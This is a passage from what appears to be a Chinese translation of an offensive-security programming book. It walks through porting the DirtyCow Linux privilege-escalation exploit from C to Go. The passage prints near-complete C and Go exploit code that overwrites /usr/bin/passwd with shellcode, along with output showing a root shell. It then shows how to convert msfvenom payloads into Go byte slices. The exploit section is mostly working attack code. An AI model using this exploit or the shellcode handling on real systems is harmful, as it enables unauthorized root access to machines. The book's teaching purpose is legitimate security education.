现在来回顾一下 `waitForWrite()` 函数，该函数监视SUID是否发生更改，以便执行shellcode。C版本如清单9-10所示，Go版本如清单9-11所示。

```c
void *waitForWrite(void *arg) {
    char buf[sc_len];
    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary); break;
        }
        fclose(fp);
        sleep(1); 
    }
    stop = 1;
    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");
    system(suid_binary); 
}
```

清单 9-10: C 中的 _waitForWrite\(\)_ 函数

```go
func waitForWrite() {
    buf := make([]byte, len(sc))
    for {
        f, err := os.Open(SuidBinary) 
        if err != nil {
            log.Fatal(err) 
        }
        if _, err := f.Read(buf); err != nil { 
            log.Fatal(err)
        }
        f.Close()
        if bytes.Compare(buf, sc) == 0 {
            fmt.Printf("%s is overwritten\n", SuidBinary)
            break 
        }
        time.Sleep(1*time.Second) 
    }
    signals <- true 
    signals <- true

    fmt.Println("Popping root shell") 
    fmt.Println("Don't forget to restore /tmp/bak\n")

    attr := os.ProcAttr {
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
    }
    proc, err := os.StartProcess(SuidBinary, nil, &attr)
    if err !=nil {
        log.Fatal(err) 
    }
    proc.Wait()
    os.Exit(0) 
}
```

清单 9-11: Go中的 _waitForWrite\(\)_ 函数

在这两种情况下，代码都定义了一个无限循环，该循环监视SUID二进制文件的变动。C中使用 `memcmp()` shellcode是否已写入目标，而Go代码使用 `bytes.Compare()`。当shellcode出现时，就会知道该漏洞成功地覆盖了文件。然后跳出无限循环，向正在运行的线程发出信号，表示它们现在可以停止了。与竞争条件的代码一样，Go版本通过通道来实现这一点，而C版本使用一个整数。最后，执行的可能是函数中最好的部分：SUID目标文件现在包含了恶意代码。Go代码有点冗长，因为需要传入与stdin, stdout和stderr对应的属性：分别指向打开输入文件、输出文件和错误文件描述符的文件指针。

现在看一下 `main()` 函数，它调用前面执行此漏洞所需的函数。清单9-12是C代码，清单9-13是Go代码。

```c
int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n"); 
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary); 
    system(backup);

    f = open(suid_binary,O_RDONLY); 
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size]; 
    memset(payload, 0x90, st.st_size); 
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); 

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, &madviseThread, suid_binary); 
    pthread_create(&pth2, NULL, &procselfmemThread, payload); 
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0; 
}
```

清单 9-12: C中的 _main\(\)_ 函数

```go
func main() {
    fmt.Println("DirtyCow root privilege escalation") 
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)

    backup := exec.Command("cp", SuidBinary, "/tmp/bak") 
    if err := backup.Run(); err != nil {
        log.Fatal(err) 
    }

    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600) 
    if err != nil {
        log.Fatal(err) 
    }
    st, err := f.Stat() 
    if err != nil {
        log.Fatal(err) 
    }

    fmt.Printf("Size of binary: %d\n", st.Size())

    payload := make([]byte, st.Size()) 
    for i, _ := range payload {
        payload[i] = 0x90 
    }
    for i, v := range sc { 
        payload[i] = v
    }

    mapp, _, _ = syscall.Syscall6( 
        syscall.SYS_MMAP,
        uintptr(0), 
        uintptr(st.Size()), 
        uintptr(syscall.PROT_READ), 
        uintptr(syscall.MAP_PRIVATE), 
        f.Fd(),
        0,
    )

    fmt.Println("Racing, this may take a while..\n") 
    go madvise()
    go procselfmem(payload)
    waitForWrite()
}
```

清单 9-13: Go中的 _main\(\)_ 函数

`main()` 函数首先备份目标可执行文件。由于最终要覆盖它，因此不想丢失原始版本；这样做可能会对系统造成不好的影响。虽然C可以通过调用 `system()` 将整个命令作为一个字符串传给它来运行操作系统命令，但是Go需要依赖于 `exec.Command()` 函数，该函数将命令作为单独的参数传递。接下来，以只读模式打开SUID目标文件，检索文件统计信息，然后使用它们来初始化与目标文件大小相同的有效负载切片。在C语言中，通过调用 `memset()`，使用NOP \(0x90\)指令填充数组，然后通过调用`memcpy()`，使用shellcode复制数组的一部分。Go中则没有这样便利的函数。

相反，在Go中，循环遍历切片元素，并每次手动填充一个字节。之后，将对 `mapp()` 函数发出Linux系统调用，该函数会将目标SUID文件的内容映射到内存。对于以前的系统调用，可以通过搜索Linux文档来找到 `mapp()` 所需的参数。可能会注意到，Go代码调用`syscall.Syscall6()` 而不是调用 `syscall.Syscall()` 。`Syscall6()` 需要六个参数的系统调用，与 `mapp()` 一样。最后，代码启动了两个协程，并发地调用 `madvise()` 和 `procselfmem()` 函数。当竞争条件出现时，调用 `waitForWrite()` 函数，该函数监控SUID文件的改动，向线程发出停止的信号并执行恶意代码。

为了完整起见，清单9-14是移植的Go代码的全部内容。

```go
var mapp uintptr
var signals = make(chan bool, 2) 
const SuidBinary = "/usr/bin/passwd"

var sc = []byte{
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    --snip--
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}

func madvise() {
    for i := 0; i < 1000000; i++ {
        select {
            case <- signals:
            fmt.Println("madvise done")
            return
        default:
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED) }
    } 
}

func procselfmem(payload []byte) {
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
    if err != nil {
        log.Fatal(err) 
    }
    for i := 0; i < 1000000; i++ { 
        select {
        case <- signals: 
            fmt.Println("procselfmem done") 
            return
        default:
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
            f.Write(payload) 
        }
    } 
}

func waitForWrite() {
    buf := make([]byte, len(sc)) 
    for {
        f, err := os.Open(SuidBinary) 
        if err != nil {
            log.Fatal(err) 
        }
        if _, err := f.Read(buf); err != nil { 
            log.Fatal(err)
        }
        f.Close()
        if bytes.Compare(buf, sc) == 0 {
            fmt.Printf("%s is overwritten\n", SuidBinary)
            break 
        }
        time.Sleep(1*time.Second) 
    }
    signals <- true 
    signals <- true

    fmt.Println("Popping root shell") 
    fmt.Println("Don't forget to restore /tmp/bak\n")
    attr := os.ProcAttr {
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
    }
    proc, err := os.StartProcess(SuidBinary, nil, &attr) 
    if err !=nil {
        log.Fatal(err) 
    }
    proc.Wait()
    os.Exit(0) 
}

func main() {
    fmt.Println("DirtyCow root privilege escalation") 
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
    backup := exec.Command("cp", SuidBinary, "/tmp/bak") 
    if err := backup.Run(); err != nil {
        log.Fatal(err) 
    }
    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600) 
    if err != nil {
        log.Fatal(err) 
    }
    st, err := f.Stat() 
    if err != nil {
        log.Fatal(err) 
    }

    fmt.Printf("Size of binary: %d\n", st.Size())

    payload := make([]byte, st.Size()) 
    for i, _ := range payload {
        payload[i] = 0x90 
    }
    for i, v := range sc { 
        payload[i] = v
    }

    mapp, _, _ = syscall.Syscall6( 
        syscall.SYS_MMAP,
        uintptr(0), 
        uintptr(st.Size()), 
        uintptr(syscall.PROT_READ), 
        uintptr(syscall.MAP_PRIVATE), 
        f.Fd(),
        0, 
    )

    fmt.Println("Racing, this may take a while..\n") 
    go madvise()
    go procselfmem(payload)
    waitForWrite()
}
```

清单 9-14: 完整的 Go 代码 \(/ch-9/dirtycow/main.go/\)

要确认代码是否能正常运行，请在易受攻击的主机上运行。没有比看到root shell更令人满意的了。

```text
alice@ubuntu:~$ go run main.go
DirtyCow root privilege escalation Backing up /usr/bin/passwd.. to /tmp/bak Size of binary: 47032
Racing, this may take a while..

/usr/bin/passwd is overwritten 
Popping root shell
procselfmem done
Don't forget to restore /tmp/bak

root@ubuntu:/home/alice# id
uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)
```

如看见的那也，程序成功运行将备份/usr/bin /passwd文件，争夺句柄的控制权，用新的预期值覆盖文件位置，并最终生成一个系统shell。Linux id命令的输出确认alice帐户已经被提升到uid=0的值，表示root级别的特权。

### 用Go创建 Shellcode

在上一节中，使用正当的ELF格式的原始shellcode，用恶意的替代方法覆盖了一个合法文件。如何自己生成这个shellcode ?事实证明，可以使用特有的工具生成支持Go的shellcode。

我们将介绍如何使用命令行程序 `msfvenom` 进行此操作，但是我们教的是整体技术，并非是专门工具。可以使用几种方法来处理外部的二进制数据，无论是shellcode还是其他东西，并将其集成到Go代码中。请放心，以下页面更多地处理公共数据表示，而不是特定于某个工具的任何内容。

Metasploit框架是一个流行的开发和后开发工具包，它附带了 `msfvenom`，该工具可以生成任何Metasploit可用的有效负载，并将其转换为通过 `-f` 参数指定的各种格式。不幸的是，没有明确的Go转换。然而，只要稍加调整，就可以很容易地将几种格式集成到Go代码中。我们将在这里探索其中的5种格式：`C，hex，num，raw和Base64`，同时请记住，我们的最终目标是在Go中创建字节切片。

#### C转换

如果指定了C转换类型，`msfvenom`将直接以C代码中的格式生成有效负载。这似乎是逻辑上的首选，因为在本章前面我们详细介绍了C和Go之间的许多相似之处。但是，它并不是我们Go代码的最佳选则。为了说明原因，请查看以下C格式的示例输出：

```c
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" 
--snip--
"\x64\x00";
```

我们几乎只对有效负载感兴趣。为了使Go支持，必须删除分号并改变换行符。这意味着要么在除最后一行外的所有行的末尾添加 `+` 号来显式连接每一行，要么完全删除换行符成为长字符串。对于小的有效负载，这样做是可以接受的，但是对于大的有效负载，手动这样做会很繁琐。可能会需要使用其他Linux命令，如 `sed` 和 `tr` 来清理。

清理有效负载后，将把有效负载作为字符串。要创建字节切片，需要输入以下内容：

```go
payload := []byte("\xfc\xe8\x82...").
```

这是个不错的解决办法，但还可以做得更好。

#### Hex 转换

在改进之前的尝试后，来看一个 `hex` 转换。使用这种格式，`msfvenom` 会生成一个长的十六进制字符串：

```c
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400
```

如果这种格式看起来很熟悉，因为在移植Java反序列化漏洞时使用过。把该值作为字符串传递到对 `hex.DecodeString()` 的调用中。如果存在，它将返回一个字节切片和错误详情。可以这样使用它：

```go
payload, err := hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b 72280fb74a2631ff...6400")
```

把它翻译成Go是相当简单的。所要做的就是将字符串用双引号括起来，并将其传递给函数。但是，较大的有效负载将会是一个不美观的字符串，引号可能超出页边距。可以继续使用这种格式，但是如果希望代码既实用又美观，我们提供了第三种选择。

#### Num 转换

`num` 转换以十六进制的数字格式生成一个以逗号分隔的字节列表：

```text
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
--snip--
0x64, 0x00
```

可以直接用来初始化字节切片，如下所示：

```go
payload := []byte{
    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
    --snip--
    0x64, 0x00,
}
```

由于 `msfvenom` 输出是逗号分隔的，因此字节列表可以很好地跨行包装，而不必笨拙地附加数据集。唯一需要做的修改是在列表的最后一个元素后面添加一个逗号。这种输出格式很容易集成到Go代码中，格式也很好。

#### Raw 转换

`raw` 转换会以原始二进制格式生成有效负载。如果数据本身显示在终端窗口上，则可能会产生乱码，如下所示：

```bash
���`��1�d�P0�R
�8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
```

除非生成其他格式的数据，否则无法在代码中使用此数据。可能会问，为什么我们还要讨论原生二进制数据呢？好吧，因为遇到原始的二进制数据非常普遍，无论是作为用工具生成的有效负载，二进制文件的内容还是加密密钥。知道如何识别二进制数据并将其用到Go代码中将很有价值。

使用Linux中的 `xxd` 程序和 `-i` 命令行开关，可以轻松地将原始二进制数据转换为上一节的 `num` 格式。一个简单的 `msfvenom` 命令示例如下所示，可以将 `msfvenom` 生成的原始二进制输出通过管道传递到 `xxd` 命令中：

```text
$ msfvenom -p [payload] [options] –f raw | xxd -i
```

和上一节一样，可以将结果直接赋值给一个字节切片。

#### Base64 编码

尽管 `msfvenom` 不包含纯Base64编码，但遇到Base64格式的二进制数据（包括shellcode）也非常普遍的。Base64编码可能增大数据的长度，但也可以避免使用丑陋或无法使用的原始二进制数据。例如，与`num`相比，此格式在代码中更易于使用，并且可以简化HTTP等协议的数据传输。因此，值得讨论Go中的用法。

生成二进制数据的Base64编码表示形式的最简单方法是在Linux中使用 `base64` 程序。可以通过标准输入或文件来编码或解码数据。可以使用 `msfvenom` 生成原始二进制数据，然后使用以下命令对结果进行编码：

```text
$ msfvenom -p [payload] [options] –f raw | base64
```

与C输出非常相似，生成的有效负载包含换行符，作为字符串用在代码中时，必须先对其进行处理。可以在Linux中使用 `tr` 工具删除所有换行符：

```text
$ msfvenom -p [payload] [options] –f raw | base64 | tr –d "\n"
```

编码后有效负载现在以连续字符串的形式存在。然后，在Go代码中，可以通过解码字符串将原始有效负载作为字节切片获取。使用`encoding/base64` 包来完成：

```go
payload, err := base64.StdEncoding.DecodeString("/OiCAAAAYInlMcBki1Awi...WFuZAA=")
```

现在能够无障碍地处理原始的二进制数据了。

#### 关于汇编的说明

不涉及汇编的讨论shellcode和底层编程是不完整的。不幸的是，对于shellcode开发人员和汇编人员来说，Go与汇编的集成是有限的。与C不同，Go不支持内联汇编。如果把汇编集成到Go代码中，可以这么做。实际上，必须在Go中定义函数原型，并在单独的文件中使用汇编指令。然后，运行 `go build` 来编译，链接和构建最终的可执行文件。尽管看起来并不让人畏惧，但问题在于汇编语言本身。Go只支持基于Plan 9操作系统的汇编。这个系统是由贝尔实验室发明的，并在20世纪末使用。包括可用的指令和操作码在内的汇编语法几乎不存在。这使得编写纯Plan 9汇编成为一项艰巨的任务，几乎是不可能完成的任务。

### 总结

尽管缺乏汇编可用性，但Go的标准包里提供了大量利于挖洞的功能。本章介绍了混淆、移植漏洞和处理二进制数据，还有shellcode。作为额外的学习，我们建议您访问[https://www.exploit-db.com/来探索漏洞数据库，并尝试将现有的漏洞移植到Go中。这个任务繁重基于对源语言的熟练程度，但可以成为理解数据操作、网络通信和底层系统交互的绝佳机会。](https://www.exploit-db.com/来探索漏洞数据库，并尝试将现有的漏洞移植到Go中。这个任务繁重基于对源语言的熟练程度，但可以成为理解数据操作、网络通信和底层系统交互的绝佳机会。)

在下一章中，我们的重点不在开发上，而专注于生成可扩展的工具集。

